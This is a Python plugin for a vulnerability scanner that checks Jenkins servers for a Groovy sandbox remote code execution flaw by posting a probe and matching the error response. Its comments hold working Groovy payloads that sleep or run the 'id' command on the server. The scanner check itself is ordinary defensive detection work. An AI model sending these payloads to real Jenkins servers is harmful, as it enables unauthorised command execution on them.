from xing.core.BasePlugin import BasePlugin
from xing.utils import http_req, get_logger
from xing.core import PluginType, SchemeType


class Plugin(BasePlugin):
    def __init__(self):
        super(Plugin, self).__init__()
        self.plugin_type = PluginType.POC
        self.vul_name = "Jenkins RCE 漏洞"
        self.app_name = 'Jenkins'
        self.scheme = [SchemeType.HTTP, SchemeType.HTTPS]

    def verify(self, target):
        #https://github.com/gquere/pwn_jenkins
        #sandbox=true&value=class abcd{abcd(){sleep(5000)}}
        #class abcd{abcd(){def proc="id".execute();def os=new StringBuffer();proc.waitForProcessOutput(os, System.err);throw new Exception(os.toString())}}
        
        paths = ["/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/"]
        check_path = b'startup failed:<br>Script1.groovy'

        data = {
            "sandbox": "true",
            "value": "@test"
        }
        for path in paths:
            url = target + path
            conn = http_req(url, "post", data=data)
            if check_path in conn.content and b"<body" not in conn.content:
                self.logger.success("found vul {}".format(url))
                return url